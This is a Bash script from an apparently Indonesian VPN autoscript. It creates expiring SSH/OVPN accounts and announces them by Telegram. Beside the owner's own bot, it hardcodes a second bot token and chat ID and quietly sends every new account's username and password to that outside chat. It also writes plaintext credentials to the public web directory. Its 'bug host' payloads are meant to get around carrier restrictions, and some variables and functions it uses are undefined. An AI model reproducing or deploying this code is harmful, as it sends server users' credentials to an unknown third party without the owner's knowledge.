#!/bin/bash

USERNAME=$1
passwdd=$2
limitipp=$3
expp=$4
id=$5


# // Get Bot
CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
KEYX="6386703502:AAGiUjNES9aXxBWzuqNTiqDBDqd0uLcGFAs"
CHATIDX="5795571992"
URLX="https://api.telegram.org/bot$KEYX/sendMessage"
clear

# Valid Script
ipsaya=$(curl -sS ipv4.icanhazip.com)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/Zsandz/kiryu/main/izin-ip-sandz"
checking_sc() {
  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
  if [[ $date_list < $useexp ]]; then
    echo -ne
  else
    echo -e "\033[1;93m────────────────────────────────────────────"
    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          "
    echo -e "\033[1;93m────────────────────────────────────────────"
    echo -e ""
    echo -e "            \033[91;1mPERMISSION DENIED !"
    echo -e "   \033[0;33mYour VPS $ipsaya \033[0;33mHas been Banned"
    echo -e "     \033[0;33mBuy access permissions for scripts"
    echo -e "             \033[0;33mContact Admin :"
    echo -e "      \033[2;32mWhatsApp wa.me/6283851216065"
    echo -e "\033[1;93m────────────────────────────────────────────"
    exit
  fi
}
checking_sc
clear
export TIME="10"
IP=$(curl -sS ipv4.icanhazip.com)
ISP=$(cat /etc/xray/isp)
CITY=$(cat /etc/xray/city)
domain=$(cat /etc/xray/domain)
clear


# . Liner 
function baris_panjang() {
  echo -e "———————————————————————————————————————"
}

function Lunatic_Banner() {
clear
baris_panjang
echo -e "Zsandz TUNNELING"
baris_panjang
}






Xwan_Banner
  echo -e ""
  echo -e ""
baris_panjang
echo ""
Login=$USERNAME
echo
Pass=$passwdd
echo
iplimit=$limitipp
echo
masaaktif=$expp
echo
echo



#limitip
if [[ $iplimit -gt 0 ]]; then
mkdir -p /etc/kyt/limit/ssh/ip/
echo -e "$iplimit" > /etc/kyt/limit/ssh/ip/$Login
else
echo > /dev/null
fi
clear
clear
tgl=$(date -d "$masaaktif days" +"%d")
bln=$(date -d "$masaaktif days" +"%b")
thn=$(date -d "$masaaktif days" +"%Y")
expe="$tgl $bln, $thn"
tgl2=$(date +"%d")
bln2=$(date +"%b")
thn2=$(date +"%Y")
tnggl="$tgl2 $bln2, $thn2"
useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
expi="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
hariini=`date -d "0 days" +"%Y-%m-%d"`
expi=`date -d "$masaaktif days" +"%Y-%m-%d"`

if [ ! -e /etc/ssh ]; then
  mkdir -p /etc/ssh
fi

if [ -z ${Quota} ]; then
  Quota="0"
fi

c=$(echo "${Quota}" | sed 's/[^0-9]*//g')
d=$((${c} * 1024 * 1024 * 1024))

if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/ssh/${Login}
fi
DATADB=$(cat /etc/ssh/.ssh.db | grep "^#ssh#" | grep -w "${Login}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${Login}\b/d" /etc/ssh/.ssh.db
fi
echo "#ssh# ${Login} ${Pass} ${Quota} ${iplimit} ${expe}" >>/etc/ssh/.ssh.db
clear

cat > /var/www/html/ssh-$Login.txt <<-END
———————————————————————————————————————

Format SSH OVPN Account
———————————————————————————————————————
Username         : $Login
Password         : $Pass
———————————————————————————————————————
IP               : $IP
Host             : $domain
Port OpenSSH     : 443, 80, 22
Port Dropbear    : 443, 109
Port Dropbear WS : 443, 109
Port SSH UDP     : 1-65535
Port SSH WS      : 80,8080,2082,2095
Port SSH SSL WS  : 443
Port SSL/TLS     : 443-8443
Port OVPN WS SSL : 443
Port OVPN UDP    : 2200
———————————————————————————————————————
Aktif Selama     : $masaaktif Hari
Dibuat Pada      : $tnggl
Berakhir Pada    : $expe
———————————————————————————————————————
Payload WSS      : GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf] 
———————————————————————————————————————
OVPN Download    : https://$domain:81/
———————————————————————————————————————

END

CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="
<code>———————————————————————————————————————</code>
<code>SSH OVPN Account     </code>
<code>———————————————————————————————————————</code>
<code>Username         : </code> <code>$Login</code>
<code>Password         : </code> <code>$Pass</code>
<code>Limit Quota       ; </code> <code>$Quota</code>
<code>———————————————————————————————————————</code>
<code>IP               : $IP</code>
<code>Host             : </code> <code>$domain</code>
<code>Port OpenSSH     : 443, 80, 22</code>
<code>Port Dropbear    : 443, 109</code>
<code>Port SSH WS      : 80, 8080, 8081-9999 </code>
<code>Port SSH UDP     : 1-65535 </code>
<code>Port SSH SSL WS  : 443</code>
<code>Port SSL/TLS     : 400-900</code>
<code>Port OVPN WS SSL : 443</code>
<code>Port OVPN SSL    : 443</code>
<code>Port OVPN TCP    : 443, 1194</code>
<code>Port OVPN UDP    : 2200</code>
<code>BadVPN UDP       : 7100, 7300, 7300</code>
<code>———————————————————————————————————————</code>
<code>Payload WSS      : </code><code>GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf]</code>
<code>———————————————————————————————————————</code>
OVPN Download : https://$domain:81/
<code>———————————————————————————————————————</code>
<code>Save Link Account: </code>https://$domain:81/ssh-$Login.txt
<code>———————————————————————————————————————</code>
Aktif Selama         : $masaaktif Hari
Dibuat Pada          : $tnggl
Berakhir Pada        : $expe
<code>———————————————————————————————————————</code>
"
linkacount="$domain:81/ssh-$Login.txt"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
curl -s --max-time $TIMES -d "chat_id=$CHATIDX&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URLX >/dev/null
clear
PAYLOADWS="GET / HTTP/1.1[crlf]Host: [host][crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]"

PAYLOADTLS="GET wss://$domain/ HTTP/1.1[crlf]Host: [host][crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]"

PAYLOADHANCED="HEAD / HTTP/1.1[crlf]Host: Masukan_Bug[crlf][crlf]PATCH / HTTP/1.1[crlf]Host: [host][crlf]Upgrade: websocket[crlf][crlf][split]HTTP/ 1[crlf][crlf]"
#cat <<EOF > akun/ssh-$Login.json
#{
#  "type": "ssh",
#  "remark": "${Login}",
#  "password": "${Pass}",
#  "limit_ip": "${iplimit} Devic",
 # "domain": "${domain}",
#  "isp": "${ISP}",
#  "openssh": "443, 80, 22",
#  "port_udp": "1-65535",
#  "ssh_ws": "80,8080,8880,2082",
#  "ssl_tls": "443",
#  "ovpn_udp": "2200",
 # "port_80": "${domain}:80@${Login}:${Pass}",
 # "port_443": "${domain}:443@${Login}:${Pass}",
#  "udp_custom": "${domain}:1-65535@${Login}:${Pass}",
#  "payload_ws": "${PAYLOADWS}",
#  "payload_tls": "${PAYLOADTLS}",
#  "payload_encd": #"${PAYLOADHANCED}",
 # "expiry_on": "${expe}"
#}
#EOF

# Lokasi file JSON
FILE="/etc/akun/$id.json"
mkdir -p "/etc/akun"
# Buat JSON untuk user baru
NEW_SSH=$(jq -n \
  --arg user "$Login" \
  --arg key "ssh-$Login" \
  --arg type "ssh" \
  --arg remark "$Login" \
  --arg password "$Pass" \
  --arg limit_ip "${iplimit} Devic" \
  --arg domain "$domain" \
  --arg isp "$ISP" \
  --arg openssh "443, 80, 22" \
  --arg port_udp "1-65535" \
  --arg ssh_ws "80,8080,8880,2082" \
  --arg ssl_tls "443" \
  --arg ovpn_udp "2200" \
  --arg port_80 "${domain}:80@${Login}:${Pass}" \
  --arg port_443 "${domain}:443@${Login}:${Pass}" \
  --arg udp_custom "${domain}:1-65535@${Login}:${Pass}" \
  --arg payload_ws "$PAYLOADWS" \
  --arg payload_tls "$PAYLOADTLS" \
  --arg payload_encd "$PAYLOADHANCED" \
  --arg expiry_on "$expe" \
  '{($key): {
    type: $type,
    remark: $remark,
    password: $password,
    limit_ip: $limit_ip,
    domain: $domain,
    isp: $isp,
    openssh: $openssh,
    port_udp: $port_udp,
    ssh_ws: $ssh_ws,
    ssl_tls: $ssl_tls,
    ovpn_udp: $ovpn_udp,
    port_80: $port_80,
    port_443: $port_443,
    udp_custom: $udp_custom,
    payload_ws: $payload_ws,
    payload_tls: $payload_tls,
    payload_encd: $payload_encd,
    expiry_on: $expiry_on
  }}')

# Jika file belum ada, buat file baru
if [ ! -f "$FILE" ]; then
  echo "$NEW_SSH" > "$FILE"
else
  # Jika file sudah ada, tambahkan user baru atau update user lama
  jq ". + $NEW_SSH" "$FILE" > temp.json && mv temp.json "$FILE"
fi